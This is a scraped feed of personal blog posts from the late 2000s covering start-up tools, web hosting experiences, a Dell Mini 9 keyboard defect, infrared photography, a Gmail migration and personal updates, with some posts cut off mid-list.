<p>Unless you&#8217;ve changed your password on the DomainsByProxy web site, your GoDaddy password should work. From there, you can update your information - or like me, cancel the service completely. Now you are free to renew the domain without paying the extra annual fee or transfer to another registrar.</p>

      <title>GetSatisfaction: Is it worth it?</title>
      <description><p>While working on the list of tools and services to write about as part of my <a href="http://adamcaudill.com/2009/06/18/start-up-tools-services/">Start-up Tools</a> series, <a href="http://getsatisfaction.com/">Get Satisfaction</a> has been the hardest to decide on. After a lot of reading, I decided against recommending it, though I had to write about it because so many companies have opted to use it.</p>

<p>Get Satisfaction is a great concept for the most part - what it boils down to is a specialized forum service for your customers to discuss issues and ideas about your products. But it&#8217;s not quite that simple, as your customer can create a site with them in your company&#8217;s name, without your knowledge as 37signals <a href="http://www.37signals.com/svn/posts/1650-get-satisfaction-or-else">found out</a> - (and they weren&#8217;t happy about it). The article by 37signals goes into length about the issues surrounding the service, so I won&#8217;t repeat them all here - it&#8217;s well worth the time to read if you are thinking about using the service.</p>

<p>While they do offer a rather anemic free version, if you want anything useful you&#8217;ll have to shell out for one of the <a href="http://getsatisfaction.com/features">paid versions</a> which start at $99/month. That&#8217;s $1,188 per year, which for most start-ups would be among their top expenses.</p>

<p>While they have made some <a href="http://blog.getsatisfaction.com/2009/03/31/kissing-and-making-up-with-37signals/">changes</a> to reduce the mafioso feel that many complained about, however the feeling that you have to participate if you care about customers still lingers. With prices ranging from $99 to $899 a month for what amounts to little more than a forum service - it&#8217;s simply too expensive for many start-ups.</p>

<p>While I understand that they are in business to make money just as I am, my budget is still very tight and there are many other needs fighting over that same money. Supporting customers has to be the top priority, but is this really the best way to achieve that?</p>

<p>To me it seems that money may be better spent on hardware upgrades to make our servers faster or some <a href="http://crazyegg.com/">real analytics</a> to make sure our web sites are as easy to use as possible. While the service has some nice benefits, spending over $1,100 a year for access to a locked-down forum just doesn&#8217;t make business sense.</p>

<p>Oh, and do you want it to match the look and feel of your web site? We&#8217;ll for that you have to upgrade to their top plan at a whopping $899 a month. Yet themes are a basic feature of virtually all forum systems.</p>

<p>For me, I think I&#8217;ll give <a href="http://bbpress.org/">bbPress</a> a shot - it&#8217;s free, open source, and easy to use - then I&#8217;ll take that $99/month and find better ways for it to serve my customers.</p>

      <title>Start-up Tools: Open Atrium</title>
      <description><p>When it comes to small business project management, <a href="http://www.basecamphq.com/">Basecamp</a> by <a href="http://www.37signals.com/">37signals</a> has been the king of the hill for some time. Now though, there is an exciting new player in the field: <a href="http://openatrium.com/">Open Atrium</a>. It&#8217;s a <a href="http://drupal.org/">Drupal</a> based open source project management system somewhat like Basecamp, though with many more features.</p>

<p><img src="http://adamcaudill.com/files/2009-07-18_1345.png" alt="" /></p>

<p>Open Atrium is new on the scene, with beta 1 being released just 4 days ago - though it&#8217;s already rather polished and seems to work well. While there are some hiccups with the installer and a disappointing lack of documentation, it&#8217;s still very easy to install and takes only a few minutes to get running.</p>

<p>It has all the major <a href="http://openatrium.com/features">features</a> that you would expect, plus a few extras such as a twitter-like shoutbox system. Here are the highlights:</p>

<ul>
<li><p>Blogging</p></li>
<li><p>Calendar</p></li>
<li><p>Dashboard</p></li>
<li><p>Document Storage</p></li>
<li><p>Task Management</p></li>
</ul>


<p>Being open source and self-hosted adds some nice benefits; unlimited customization, full control of your data, and my favorite: can be installed on a non-public web server. Having you project management system sit behind a VPN is a great way to avoid <a href="http://www.techcrunch.com/2009/07/14/in-our-inbox-hundreds-of-confidential-twitter-documents/">data leaks and embarrassments</a>.</p>

<p>I&#8217;m still debating which is best, Basecamp or Open Atrium - but if you want to save some money, Open Atrium is worth looking into.</p>

      <title>Start-up Tools: Microsoft BizSpark</title>
      <description><p>Good developers need good tools, it&#8217;s simple as that. If you are building software for Windows, the only real option is Visual Studio. The down side to Visual Studio? The <a href="http://msdn.microsoft.com/en-us/subscriptions/subscriptionschart.aspx">$1,200</a> starting price tag. While Microsoft is now providing the free <a href="http://www.microsoft.com/express/">Express editions</a>, these are aimed more at hobbyists, not serious developers.</p>

<p>Microsoft thankfully is here to help: If your company is less than three years old and has less than $1 million in annual revenue, they have a program to give you all that you need. <a href="http://www.microsoft.com/bizspark/">BizSpark</a> provides the key tools and technologies to get your start-up moving without impacting your budget.</p>

<p>The BizSpark program provides Visual Studio Team Suite + MSDN Premium for your developers (up to 25),  plus <em>production </em>licenses for software like Windows 2008 Server and SQL Server 2008. Unlike Microsoft&#8217;s other start-up helper <a href="http://empowerforisv.com/">Empower</a>, there are no requirements that you use certain technologies or pursue any certifications.</p>

<p>While Empower does provide licenses for things such as Office for employee use which BizSpark does not, BizSpark more than makes up for it in the production server licensing.</p>

<p>For a start-up with little funding (normally what the founders happen to have in the bank), building for the Linux platform using MySQL and <a href="http://rubyonrails.org/">Ruby on Rails</a> can be very tempting. Now with BizSpark the money takes a back seat (at least for the first three years), and the technologies can compete on a level playing field.</p>

      <title>Silverlight 3 Tools Available</title>
      <description><p>It looks like the core Silverlight 3 tools are now available:</p>

<ul>
<li><p><a href="http://www.microsoft.com/downloads/details.aspx?displaylang=en&amp;FamilyID=92e1db7a-5d36-449b-8c6b-d25f078f3609">Microsoft Expression Blend 3 + SketchFlow RC</a></p></li>

      <title>Lumix DMC-FZ8 &amp; Infrared</title>
      <description><p>After several months of tests and experiments, I have finally determined something: <a href="http://en.wikipedia.org/wiki/Infrared_photography">Infrared</a> with the Lumix <a href="http://www.dpreview.com/news/0701/07013106panasonicfz8.asp">DMC-FZ8</a> just doesn&#8217;t work.
<a href="http://www.flickr.com/photos/adamcaudill/2789422097"></a></p>

<p><a href="http://www.flickr.com/photos/adamcaudill/2789422097"><img src="http://farm4.static.flickr.com/3184/2789422097_5bdc2f0d88_m.jpg" alt="Early IR Test" /></a></p>

<p>I&#8217;ve been trying to use a <a href="http://www.jpgmag.com/stories/71">R72</a> Near-Infrared filter to filter out the &#8220;normal&#8221; light that we see, leaving only the infrared light that I wanted to capture. The FZ8 is sensitive to infrared, as can be easily demonstrated by taking a picture of a TV remote control. What you&#8217;ll see is a couple points of light coming from the remote; these are the infrared lights that are used to transmit commands to the TV.</p>

<p>Though having a camera that is sensitive to infrared, doesn&#8217;t make it suited for infrared photography. While the FZ8 is a great camera, being light weight, offering pro-level options (such as RAW mode) without the bulk of a DSLR - this is one thing that just doesn&#8217;t work.</p>

<p>Here are a few of the issues I&#8217;ve seen, and so far been unable to get passed:</p>

<ul>
<li><p>Auto-Focus: While this isn&#8217;t a huge surprise, auto-focus doesn&#8217;t work when the R72 filter is in place.</p></li>
<li><p>Manual-Focus: The FZ8 does offer manual focus, though using it when there is so little light making it to the sensor is nearly impossible.</p></li>
<li><p>Grainy: Even when ISO is set to 100 instead of the default of auto, the images are extremely grainy. While this can provide a somewhat artistic effect - it&#8217;s not what I&#8217;m looking for.</p></li>
</ul>


<p>While it does seem to have some promise in replicating an infrared version of <a href="http://en.wikipedia.org/wiki/Pinhole_camera">pinhole photography</a>, it simply doesn&#8217;t work for traditional infrared.</p>

      <title>Avatars - Why roll your own?</title>
      <description><p>I&#8217;ve been working on a project recently that uses avatars, while planning out this specific feature it occurred to me - why should we re-invent the wheel? There&#8217;s already at least one service that specializes in doing it right: <a href="http://en.gravatar.com/">Gravatar</a>.</p>

<p>While building something as simple as avatar support takes a relatively small amount of time, when working against a tight deadline or a tight budget every minute counts. In the world of an ISV (especially a young one) the balance of user satisfaction and development time is critical. Using a service such as Gravatar is a great way to give the users what they want with minimal impact to the timeline.</p>

<p>With a <a href="http://en.gravatar.com/site/implement">super-simple implementation</a> we were able to get it running within a few minutes - compare that to at least a few hours to build a custom system. Plus, reduced server load as we aren&#8217;t hosting the images and a cleaner, simpler interface as it&#8217;s one less option the user has to look through.</p>

      <title>Start-up Tools &amp; Services</title>
      <description><p>Over the next few weeks (and months) I&#8217;ll be posting a series of articles on the tools and services that start-ups can use to make their business both more efficient and more profitable. This is aimed at ISVs (both micro and close to micro) though most of this should apply to any technology startup.</p>

<p>When you are starting a business, there are many important considerations with anything you use, here are the keys points I&#8217;ll be looking at:</p>

<ul>
<li><p>Expense - This is probably the top requirement. Budgets tend to be quite limited, and there are always too many demands on what budget is available.</p></li>
<li><p>Effectiveness - It has to work; when running an ISV you simply don&#8217;t have time to waste. There is software to build and a business to run - there&#8217;s no time to waste on things that don&#8217;t work.</p></li>
<li><p>Power - Just because you&#8217;re running a small business, doesn&#8217;t mean you have to miss out on the power and features available to significantly larger business.</p></li>
<li><p>Flexibility - ISVs have a great benefit over larger businesses; agility. The very nature of smaller businesses give them a great ability to adapt to change - and the tools and services they use should be just as flexible.</p></li>
</ul>


<p>There are many great resources out there - the challenge is digging through the clutter.</p>

      <title>Remember The Milk</title>
      <description><p>I&#8217;ve been a fan of <a href="http://crowdfavorite.com/tasks/">Tasks</a> for quite some time, though as time goes on and updates don&#8217;t come out, it seems less and less attractive. As most web-based services have fully embraced Web 2.o with all its AJAXy goodness, Tasks remains firmly entrenched in Web 1.0; and I&#8217;ve finally given up.</p>

<p>We are in a world where instant is no longer a nice-to-have, but an absolute must. Applications and services should; no, must provide immediate feedback and minimize full page loads whenever possible. Tasks has failed on this front.</p>

<p>Enter <a href="http://www.rememberthemilk.com/">Remember The Milk</a>, a simple yet highly customizable task management system. While some things are rather different from Tasks (such as having multiple task lists, and not having nested tasks) for the most part it does everything that Tasks does - only it&#8217;s free (or $25/year for a <a href="http://www.rememberthemilk.com/upgrade/">Pro account</a>). With a low price, simple easy to use interface, and plenty of AJAX to keep things moving - it&#8217;s a real winner.</p>

<p>When I started using RTM the biggest issue I had was the lack of nested tasks that I had become so accustomed to in Tasks. The more I use RTM though, I&#8217;m finding that not burying tasks inside of other tasks is actually helping me to get more done, as less is being lost and forgotten about. While seeing all of the tasks laid out in front of me does seem a bit overwhelming at times, I am getting more done.</p>

<p>Overall, RTM helps me get thing done, while wasting as little time as possible managing tasks. Highly recommended.</p>

      <title>Switching hosts, again.</title>
      <description><p>So here we go again - my 4th hosting company since I started this blog. Maybe I&#8217;ll have better luck this time? For those interested, here&#8217;s the rundown of which hosts I&#8217;ve used, and what I&#8217;m doing today.</p>

<p><a href="http://radicalv.com/"><strong>Radical Vision</strong></a><strong> - Lasted 4 years</strong></p>

<p>Radical Vision was once a great host, though as time went on I had more than a <a href="http://adamcaudill.com/2006/08/09/hosting-woes-and-down-time/">few issues</a> with them. I tried to give them a chance (several chances, actually). During the first year or so, they were great about updating software and keeping things on the cutting edge - by the end, they were using a known vulnerable version of PHP and behind updates on pretty much every major piece of software in use.</p>

<p>After broken promises and many unanswered support tickets, I decided to close my account, that&#8217;s when the worst came. It took me two months of emails, support tickets, phone calls, and even contacting the company that owned the data center they were located in before I was able to close my account.</p>

<p>As I was fighting to close my account they were bought out by another company, I hope things have gotten better since the buy-out.</p>

<p><strong><a href="http://www.hostingrails.com/">HostingRails</a> - Lasted 1 year</strong></p>

<p>After being with a host that was so far behind, HostingRails was a breath of fresh air - everything was cutting edge, latest version of everything. Support was great, servers were nice &amp; fast, really good host.</p>

<p>I was quite happy with them - with one exception: server load. Normally I would expect to see high loads on servers that are <a href="http://en.wikipedia.org/wiki/Overselling">oversold</a>, but I don&#8217;t think this was the case as the normal load was quite low. The spikes on the other hand, were anything but low - by the time I switched, it wasn&#8217;t uncommon to see <a href="http://en.wikipedia.org/wiki/Load_(computing">load</a>) jumping to 20+ and on a few occasions the load exceeded 50!</p>

<p>It may have just been a matter of me being unlucky in having another person on the sever that was abusing the system, but either way it was getting old. I&#8217;d like to do business with them again, though next time I&#8217;ll go <a href="http://www.hostingrails.com/vps_hosting">VPS</a> instead of shared.</p>

<p><strong><a href="http://servage.net/">Servage</a> - Lasted 6 months</strong></p>

<p>Servage provides budget hosting with a nice set of <a href="http://www.servage.net/page/features/">features</a>, quick support, and a fairly impressive control panel. If you are looking for a low-cost hosting company with a few nice extras - Servage does quite well. Though soon after switching I ran into a familiar issue - server load. While it seems that their web servers are quite fast - the database servers are often bogged down.</p>

<p>After getting yet another database connection error, I decided it was time to look for another option.</p>

<p><strong><a href="http://www.dreamhost.com/hosting.html">DreamHost</a> - Current</strong></p>

<p>I&#8217;ve heard many good things about DreamHost - including from a few start-ups running their projects from the normal shared hosting package. If it&#8217;s good enough for them, should be more than enough for me.</p>

<p>These people have just completely wowed me so far - the best control panel I&#8217;ve used, the most features I&#8217;ve seen from a shared host (especially in this price range), extremely fast servers. The best for me, is the SSH access - as it seems fewer and fewer shared hosts are allowing this type of access.</p>

<p>For now, if you are looking for good, low cost Linux hosting - DreamHost gets my vote.</p>

      <title>Programmers are Expensive</title>
      <description><p>I normally don&#8217;t write posts just to point out an article by another author, but the latest by <a href="http://www.codinghorror.com/blog/">Jeff Atwood</a> is a must read:</p>

<p><a href="http://www.codinghorror.com/blog/archives/001198.html">Hardware is Cheap, Programmers are Expensive</a></p>

<p>I point this out because this is something I&#8217;ve been fighting recently. It&#8217;s easier for management to tell the development team to fix a performance issue than to request money for the new hardware that&#8217;s needed.</p>

<p>In the long run it would be much cheaper to just throw more hardware at it - though that requires higher level approval. Whereas assigning a couple developers doesn&#8217;t require going nearly as high.</p>

      <title>Dell Mini 9 Spacebar / Keyboard Issues</title>
      <description><p>I recently <a href="http://adamcaudill.com/2008/12/07/dell-mini-keyboard-issues/">wrote</a> about some issues I&#8217;ve had with my Dell Mini 9. Since I received my Mini its had issues with the keyboard, primarily that the spacebar wouldn&#8217;t respond. Something I&#8217;ve heard several other people say; leading me to believe it&#8217;s a flaw in the design.</p>

<p>A quick chat with Dell support and a new keyboard was on the way. Shipped FedEx Priority Overnight no less.</p>

<p>I ordered my Mini within hours of it being released, so it&#8217;s a fairly early unit. When I received the new keyboard I was rather disappointed to see the it was marked &#8220;A00&#8221; - which is Dell-speak for version 1.0. So obviously when I saw that, it was a bit frustrating. What&#8217;s the point in replacing a flawed keyboard with another flawed keyboard?</p>

<p>After removing the existing keyboard I found something I really didn&#8217;t expect; the existing keyboard was marked &#8220;A02.&#8221; So my early model Mini has the newer keyboard! So, let&#8217;s take a quick look at what we know so far:</p>

<ul>
<li><p>A00 - This keyboard has the same layout as the A02; the keys are printed a bit darker making it harder to see in low light. The keys are a bit stiffer when you press them, and all the keys seem to respond reliably.</p></li>
<li><p>A01 - I&#8217;ve yet to see any information on this one, though we must assume it exists.</p></li>
<li><p>A02 - This version has brighter printing on the keys though seems to have a defect affecting at least the spacebar and perhaps other keys. Pressing the keys, they feel somewhat cheep or flimsy.</p></li>
</ul>


<p>These details are for the US-English, 61 key layout,  Dell part # M958H. There is also an US-International version (U061H) <a href="http://mydellmini.com/forum/replacement-keyboard-more-normal-t1402.html">floating</a> around with a somewhat different layout that some people may prefer.</p>

<p>Though I don&#8217;t like how dark the Aoo keyboard is, it does seem to correct the issue with the keyboard missing presses. The process of changing the keyboard only takes a few minutes and the <a href="http://support.dell.com/support/edocs/systems/ins910/en/sm/keyboard.htm#wp1183262">instructions</a> cover everything you need to know.</p>

      <title>Working Late, Again</title>
      <description><p>Ladies, do you know where your husband is? If he&#8217;s anything like me (or the rest of my team), he&#8217;s at the office. At 4AM. Again.</p>

<p>For the third week in a row I find myself at work at the wee hours of the morning preparing for a project launch. Though today more than ever I find myself asking questions; what takes priority, the needs of a company, or the needs of a relationship? What&#8217;s more important, the health of a project, or my own health? Should I be working to make this project a success, or sleeping to stay healthy?</p>

<p>Normally these questions are simple and obvious - yet so often we choose our projects over ourselves, our companies over our loved ones. Why? Is it the drive for success, the challenge of doing the impossible? Maybe it&#8217;s the money? Why do developers so often sacrifice so much?</p>

<p>This isn&#8217;t a guide to better managing time, or a treatise on setting priorities; no, it&#8217;s a developer&#8217;s lament. So much is given for a company that does little but ask for more; yet more we always give. We know there are things far more important, but yet so much rides on our efforts, so many people counting on us; how could we dare let them down? Though I appreciate my paycheck, it doesn&#8217;t drive me to do more - it&#8217;s the people, the challenge, the fact only I can make this happen.</p>

<p>Sometimes though, I wish I could bring myself to accept failure; maybe then the pressure wouldn&#8217;t be so great. Maybe then, I could sleep at night.</p>

<p>But this is what we do, we make the miracles; we do the impossible. Every day we face another challenge, every day we find another solution. Now if we could just find a solution for all this time lost from what matters most.</p>

      <title>Dell Mini Keyboard Issues</title>
      <description><p>So far I love my Dell Mini 9; it&#8217;s a great laptop. Though from the day I received it there&#8217;s been a problem. The space bar.</p>

<p>It&#8217;s a simple but vital key, and very frustrating when it ignores you. There seems to be a common issue on the early Mini&#8217;s with the space bar sometimes ignoring input. Depending on just where you hit the key, it likely won&#8217;t register.</p>

<p>Today I was finally fed up and contacted Dell support. After chatting with a technician for about five minutes he agreed to send me a replacement keyboard. Simple, painless, fast.</p>

<p>If you&#8217;ve got a Dell Mini, I&#8217;d advise getting the new keyboard - not only is the space bar issue corrected; but I&#8217;m hearing that a couple keys have been moved to more useful positions.</p>

<p><strong>Update:</strong> See my comment below for the latest updates.</p>

      <title>Is this thing on?</title>
      <description><p>Wow! It&#8217;s been over a year since this blog o&#8217; mine has seen any activity, though I&#8217;ve certainly not forgot about it. A lot has happened in the last year, so I&#8217;ll use this post as a bit of an update (and a warm-up for my return to blogging).</p>

<p>I&#8217;m not going to promise you&#8217;ll see a new post daily as was once the case, though I&#8217;ll try to ensure something new is up at least once a week.</p>

<p><strong>Life</strong> - It&#8217;s been an exciting year; I&#8217;ve moved into a <a href="http://www.flickr.com/photos/adamcaudill/sets/72157603919212651/">new house</a>, now engaged (the big day is in May), and I&#8217;m now driving a <a href="http://www.mazdausa.com/MusaWeb/displayPage.action?pageParameter=modelsMain&amp;vehicleCode=CX7">Mazda CX-7</a>. There&#8217;s a lot more, but I&#8217;ll not bore you with too many details.</p>

<p>The house is a restored 1880&#8217;s farmhouse that has some great history. Buying a house is an adventure, especially in this market. Scary might be a better word. The only real problem, is much like <a href="http://www.37signals.com/svn/posts/1332-rural-internet-stuck-in-the-slow-zone">Jeff&#8217;s</a> (of <a href="http://www.37signals.com">37signals</a> fame), it&#8217;s in the middle of nowhere. My solution for the Internet issue was to sign up for <a href="http://en.wikipedia.org/wiki/Satellite_internet">Satellite Internet</a>; it&#8217;s laggy but it works.</p>

<p>The new ride replaced my <a href="http://www.flickr.com/photos/adamcaudill/sets/72157600242021713/">&#8216;07 Jetta</a> (which was a great car), the CX-7 has lots of power (244 <a href="http://en.wikipedia.org/wiki/Horsepower">HP</a>), full-time all-wheel drive, and a very sporty feel. It&#8217;s a great car, and for a mid-size SUV it does pretty well on fuel.</p>

<p><strong>Hosting</strong> - When I last posted I had been with <a href="http://radicalv.com/">RadicalV</a> for a few weeks shy of four years. When I left they were pretty much falling apart - downtime was common, no support at all, and numerous other issues. Once I moved to the next host, it took them three months to cancel the account and stop billing me. It started out as the best host I&#8217;d ever used, and ended as the worst. My understanding is that the company was sold since then, so hopefully things have improved for their remaining customers.</p>

<p>After leaving RadicalV, I went a fairly new (at the time) host, <a href="http://www.hostingrails.com/">HostingRails</a>. I was mostly happy with them; great service, reasonable prices, and the very latest of everything. The major downside though was the server loads. It wasn&#8217;t uncommon for the load to be so high that it was grinding to a halt. Great service but it seems they are pretty over-sold.</p>

<p>And now? I&#8217;m currently on <a href="http://www.servage.net/">Servage</a> because of its clustered environment and low prices. As time goes on, I&#8217;ll post updates on how this one works out.</p>

<p><strong><a href="http://adamcaudill.com/files/2008/11/inspiron-910.jpg"><img src="http://adamcaudill.com/files/2008/11/inspiron-910-150x150.jpg" alt="Dell Mini 9" /></a>Computers</strong> - My primary laptop has changed from my trusty Acer to the ultra mobile <a href="http://www.dell.com/content/products/productdetails.aspx/laptop-inspiron-9?cs=19&amp;s=dhs&amp;ref=homepg">Dell Mini 9</a>. At just over two pounds and up to four hours of battery life, it&#8217;s a carry anywhere on the go  type system. It&#8217;s great.</p>

<p>It&#8217;s not the cheapest of the so called netbooks, but with a little work it&#8217;s a great system. I&#8217;m running Windows 2008 Server with the <a href="http://blogs.msdn.com/vijaysk/archive/2008/02/11/using-windows-server-2008-as-a-super-desktop-os.aspx">Desktop Experience Pack</a>. When configured correctly, it&#8217;s a killer system.</p>

<p><strong>Work</strong> - I&#8217;m still at the same company, though my responsibilities have changed. I&#8217;ve crossed the line into management. I&#8217;ve often heard the joke that managing developers is more like <a href="http://www.amazon.com/Herding-Cats-Primer-Programmers-Lead/dp/1590590171">herding cats</a> - it&#8217;s quite true.</p>

<p><strong>This Site</strong> - I&#8217;ve upgraded the site to the latest beta release of WordPress, <a href="http://wordpress.org/development/2008/11/wordpress-27-beta-3/">2.7 Beta 3</a>. What does this mean for you? Not too much, it did allow me to add a &#8217;<a href="http://adamcaudill.com/tags/">Tags</a>&#8217; page, but most of the changes are behind the scenes. If you have a blog, I <em>highly</em> recommend you upgrade. I upgraded from 2.2 and it was quite painless.</p>

<p>I&#8217;ll be posting on management styles and tools and tricks soon.</p>

<p>So, there we go - I think we&#8217;re all caught up now. :)</p>

      <title>Switching to Gmail, Again</title>
      <description><p>Once <a href="http://adamcaudill.com/2007/02/06/from-outlook-to-gmail-to-the-bat/">again</a>, I&#8217;ve decided to switch email clients; this time from <a href="http://www.ritlabs.com/en/products/thebat/">The Bat</a> to Gmail, or more specifically, to <a href="https://www.google.com/a/">Google Apps</a>. After some recent issues with The Bat (mostly relating to a recent update), I decided to make another go at switching to Gmail; but this time trying the Google Apps version.</p>

<p>After my last attempt, I was <a href="http://adamcaudill.com/2007/02/06/from-outlook-to-gmail-to-the-bat/#comment-387">informed</a> that the Google Apps edition of Gmail doesn&#8217;t suffer the <code>Sender</code> issue that so plagued me before. After almost a full day of work, the transition is complete. And I couldn&#8217;t be happier.</p>

<p>The only downside is the expense - all in all, it cost $78.95 to go through this process. This was spent on two tools that made the process possible:</p>

<ul>
<li><p><a href="http://www.aid4mail.com/">Aid4Mail</a> - A key application used for converting the various mail-storage file formats.</p></li>
<li><p><a href="http://www.limitnone.com/products.php?p=gmove">gMOVE</a> - Used for importing PST files into Gmail.</p></li>
</ul>


<p>The process itself was simple, once I had found the software I needed, which took some doing. Here&#8217;s an overview, and some notes if you happen to try something like this (this assumes that you have Outlook installed).</p>

<ul>
<li><p>Export messages to <a href="http://en.wikipedia.org/wiki/Mbox">mailbox</a> format. (If you are moving from Thunderbird this isn&#8217;t necessary as it already is stored in that format.)</p></li>
<li><p>Use Aid4Mail to convert the mbox files to PSTs</p></li>
<li><p>Load PSTs into Outlook and cleanup as necessary (remove duplicates, cleanup directory structure)</p></li>
<li><p>Launch gMOVE and use it to import the messages from Outlook to Gmail</p></li>
</ul>


<p>There are a couple major differences in this attempt, compared to the last. A few things annoyed me about the way things worked after the last time, not the least of which is that by using <a href="http://www.marklyon.org/gmail/">Gmail Loader</a> you loose all meaningful timestamps. So you don&#8217;t know when a message was sent or received.</p>

<p>gMOVE eliminated that problem. It sends the messages to a special POP3 server, and automatically configures your Gmail account to use it. That way, they can control the timestamps, and set them to what they originally were 1.</p>

<p>So after all is said and done; I think I&#8217;m happy with this system; much better than last time. I simply can&#8217;t justify using a desktop based email client anymore. It just leaves you too out of touch.</p>

<blockquote><p>1). There is a security issue here, so I wouldn&#8217;t do this with anything containing sensitive information.</p></blockquote>

      <title>Backups with JungleDisk</title>
      <description><p>I recently heard about <a href="http://jungledisk.com/">JungleDisk</a> (hat tip: <a href="http://boren.nu/archives/2007/07/03/recent-geekage/">Ryan</a>), and decided that might be the backup solution I&#8217;ve been looking for.</p>

<p>I&#8217;ve got thousands of pictures, hundreds of megabytes of source code, and documents dating back several years, all of which I&#8217;d like to ensure I never lose.  So far I&#8217;ve shied away from all of the online backup solutions due to the expense. But JungleDisk uses <a href="http://www.amazon.com/gp/browse.html?node=16427261">Amazon&#8217;s S3</a> service for storage, complete with its rather inexpensive pricing model.</p>

<p>With that pricing model, JungleDisk has the potential to provide most of what I need, and some extras that are quite nice; all at a better price. So far, I&#8217;ve looked at two options:</p>

<ol>
<li><p>Use an online service. Much lower startup cost, but comes with a recurring fee.</p></li>
<li><p>Build a backup server. This will require at least 1TB of fully redundant storage. I&#8217;ll also have to identify software that will meet my needs. Much higher startup cost, but only minimal maintenance costs after that.</p></li>
</ol>


<p>JungleDisk has a few upsides, the biggest for me is that I can access it from anywhere that I can install the client, not just when I&#8217;m connected to my home network. With a low price, simple, but flexible interface, and a great storage system on the back end - it certainly sounds like a winner.</p>

<p>Though, there are some features I&#8217;d like to see, that it doesn&#8217;t offer:</p>

<ul>
<li><p>Access to files without installing software.</p></li>
<li><p>Incremental backups. This would make backing up PST and similar files far more reasonable.</p></li>
<li><p>Store multiple versions of a file.</p></li>
<li><p>Compress data before uploading. This would save a fair bit of bandwidth for me, as I backup things such as conversation and chat logs.</p></li>
</ul>


<p>Will these missing features be enough to not use the service? I don&#8217;t know yet, I&#8217;ll give the service a couple weeks to see how it goes. So far I&#8217;m fairly impressed, though wish it offered more features.</p>

<p>Once I hit the two week-mark, I&#8217;ll post a status update; and my final decision as to whether I&#8217;ll continue to use it.</p>

      <title>Well, looks like I was wrong&#8230;</title>
      <description><p>Well, it was a while back that I said I would start writing again - that just never quite happened.</p>

<p>Much interesting has happened in these months, a few co-workers left the company, a few new faces came in; there was also a promotion and a number of new projects. Oh, and there&#8217;s a new relationship, and a fair bit of time now going to my old profession and now hobby of photography. Between all of these, spare time isn&#8217;t something I have much of - if any.</p>

<p>With all this in mind, many people would give up and walk away - but I see this as being important enough to fight for. It&#8217;s a matter of priorities and time management. For a developer, being active in the community is important; it&#8217;s easy to be left behind once you find yourself outside the loop. So, I&#8217;ll simply have to make community involvement a higher priority than it&#8217;s been. As for time management though, the story isn&#8217;t so simple.</p>

<p>I&#8217;ve been using <a href="http://crowdfavorite.com/tasks/">Tasks</a> (which I <a href="http://adamcaudill.com/2007/01/21/task-management-with-tasks/">highly recommend</a>) for a while now to keep track of what I&#8217;m working on, and for that it is quite effective. For time management though, I need to reevaluate how I work completely; find a method that allows me to be as productive as possible. I&#8217;ve seen a number of articles, guides, and books on the topic, so I believe I&#8217;ve a fair bit of reading in front of me. As I go through this process, I&#8217;ll write about my findings, and share any solutions I find.</p>

<p>If anybody has advice on how to make time for everything, I would certainly like to hear it. Hopefully, this time when I say this blog is coming back to life, it actually will.</p>

      <title>Another one bites the dust&#8230;</title>
      <description><p>Later this week I&#8217;ll start the process of closing my start-up, aDeVIX Software. After months of planning and development, the decision has finally been made to call it a day. It was a great idea, but time and money conspired against us, with great effect.</p>

<p>We had a great product in mind, just not the resources to make it happen. I do believe that it would have been quite a success, but it takes a fair bit of time, and even more money to launch a commercial product aimed at mid-size businesses. It&#8217;s not a simple thing to sell software costing more than $10,000 per install; and being a company with no reputation, it&#8217;s almost impossible.</p>

<p>We planned the design, the marketing, the budget (even allowing for snacks &amp; drinks), covered every detail, but when you don&#8217;t have the time to write code, or the money to pay people to write it for you; no amount of planning will help. We then delayed, then came up with smaller, simpler products, then scrapped all that and went back to the original idea.</p>

<p>Months of work, thousands of dollars in various expenses, and not a single dime as income; much effort, no reward. Many thousand lines of code, a few websites, countless meetings, and enough notes to account for the clearing of a small forest; but no money, no assets of value, nothing. It&#8217;s a bit painful to think about all the effort, and see that it was all for not.</p>

<p>It&#8217;s certainly possible to make an ISV work, it&#8217;s just a matter of being honest with yourself. Can you afford the expenses? Do you have the time? Will you be able to support the product yourself until it brings in enough money to hire people?</p>

<p>In some ways though, I&#8217;m happy that this is done, as it now leaves me free of any potential conflict of interest when it comes to pursuing future opportunities.</p>

      <title>A bit behind&#8230;</title>
      <description><p>Well, it was about a month ago that I wrote commenting on being sick, and letting you all know that I would be getting back to my normal writing schedule. That didn&#8217;t happen. Work happened.</p>

<p>All my time since then has been spent managing between 2 and 5 developers, and trying to get a project that would end up weighing in at almost 50,000 lines of code completed and to production. Seeing as we started without specs, and made the deadline, I&#8217;m quite happy about how it went. I learned some interesting things on this project, if I can find a way to write about it without breaking my confidentiality agreement; you may see more about it soon.</p>

<p>There are more projects, with similar near-impossible deadlines ahead, but hopefully I&#8217;ll be able to keep my head a bit more above the water.</p>

      <title>So Ends The River of Schwag</title>
      <description><p>About six months ago, I <a href="http://adamcaudill.com/2006/10/05/not-not-a-good-idea/">predicted the end</a> of the <a href="http://valleyschwag.com/">Valleyschwag</a> project, that prediction recently came to pass. The Valleyscwag team recently  <a href="http://valleyschwag.com/chronicles/2007/04/05/happy-trails/">announced</a> the last &#8216;issue&#8217; and the end of the schwag express. I knew it was coming, looks like I called it a bit too soon.</p>

<p>The model they had was interesting idea, just not one that could scale. Perhaps with a more restrictive subscription system, maybe if they had based it on invitations instead of being completely open, they could have slowed the growth enough. Perhaps, it was an idea that just would have never worked.</p>

<p>Either way, what&#8217;s over is over. The final issue has already sold out, so the party is officially over.</p>

      <title>Under the Weather</title>
      <description><p>A bit over a month ago, I came down with a nasty cold and things have been slipping since then. It&#8217;s taken me quite some to recover. This site, a number of personal projects and just about everything else has been neglected. Today is the first day in weeks I&#8217;ve been up to doing anything after work. I&#8217;ve finally started catching up on all I&#8217;ve missed.</p>

<p>Hopefully there will be more signs of life here in the coming days, as I dig out of the pile of thousands of unread items in my RSS reader. Once I dig through that pile, there are a couple articles I&#8217;ve planned that I believe will be of interest.</p>

      <title>Windows Vista User Experience Guidelines</title>
      <description><p>For those that missed it (like me), the <a href="http://msdn2.microsoft.com/en-us/library/aa511258.aspx">Windows Vista User Experience Guidelines</a> has been updated with some additional content. This update add content in the following areas:</p>

<ul>
<li><p><a href="http://msdn2.microsoft.com/en-us/library/aa511284.aspx">Software Branding</a></p></li>
<li><p><a href="http://msdn2.microsoft.com/en-us/library/aa511273.aspx">Confirmations</a></p></li>
<li><p><a href="http://msdn2.microsoft.com/en-us/library/aa511263.aspx">Warnings</a></p></li>
